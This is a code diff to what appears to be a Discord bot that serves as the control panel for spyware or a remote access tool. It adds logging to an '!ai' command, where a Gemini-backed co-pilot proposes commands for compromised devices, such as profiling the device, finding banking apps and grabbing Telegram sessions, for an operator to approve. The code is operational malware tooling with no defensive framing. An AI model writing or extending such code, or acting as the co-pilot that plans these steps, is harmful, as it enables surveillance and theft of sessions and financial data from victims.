@@ -925,17 +925,27 @@ client.on(Events.MessageCreate, async (msg) => {
           return r.ok ? msg.reply({ content: `${E.knife} Stream sent ${E.skull}`, components: RESULT_BTNS }) : msg.reply(`${E.coffin} ${r.err} ${E.skull}`)
         }
         case '!ai': {
-          if (!aiCoPilot.isAvailable) return msg.reply(`${E.coffin} AI needs Gemini API key. Get free at https://aistudio.google.com/apikey ${E.skull}`)
+          console.log(`[AI] !ai command received from ${msg.author.tag} in #${msg.channel.name}`)
+          console.log(`[AI] isAvailable: ${aiCoPilot.isAvailable}, provider: ${aiCoPilot.providerName}`)
+          if (!aiCoPilot.isAvailable) {
+            console.log(`[AI] AI not available - check GEMINI_API_KEY`)
+            return msg.reply(`${E.coffin} AI needs Gemini API key. Get free at https://aistudio.google.com/apikey ${E.skull}`)
+          }
           const aiMsg = args.join(' ')
           if (!aiMsg) return msg.reply(`${E.target} Usage: \`!ai <request>\`\nExamples:\n\`!ai profile the device\`\n\`!ai what banking apps\`\n\`!ai grab telegram sessions\` ${E.skull}`)
           await msg.channel.sendTyping()
           try {
+            console.log(`[AI] Calling processRequest with: "${aiMsg.slice(0, 50)}..."`)
             const { session, response } = await aiCoPilot.processRequest(guild.id, uid, aiMsg)
+            console.log(`[AI] Response received, proposedCommands: ${response.proposedCommands?.length}, ready: ${response.ready}`)
             if (!response.proposedCommands.length && response.ready) return msg.reply({ ...bloodEmbed(bold('🤖 AI'), 'info', response.summary || response.analysis), components: MENU_BTNS })
             const cmdList = response.proposedCommands.map((c, i) => `**${i + 1}.** \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')
             const text = response.analysis ? `**Analysis:** ${response.analysis}\n\n**Proposed:**\n${cmdList}` : `**Proposed:**\n${cmdList}`
             return msg.reply({ ...bloodEmbed(bold('🤖 AI'), 'warning', text), components: actionRow(btn(`ai_approve_${uid}`, 'APPROVE', '✅', 'success'), btn(`ai_reject_${uid}`, 'REJECT', '❌', 'danger')) })
-          } catch (err) { return msg.reply(`${E.coffin} AI error: ${err.message} ${E.skull}`) }
+          } catch (err) {
+            console.error(`[AI] ERROR:`, err.message, err.stack?.slice(0, 500))
+            return msg.reply(`${E.coffin} AI error: ${err.message} ${E.skull}`)
+          }
         }
         case '!campaign': {
           if (!aiCoPilot.isAvailable) return msg.reply(`${E.coffin} AI needs Gemini API key ${E.skull}`)
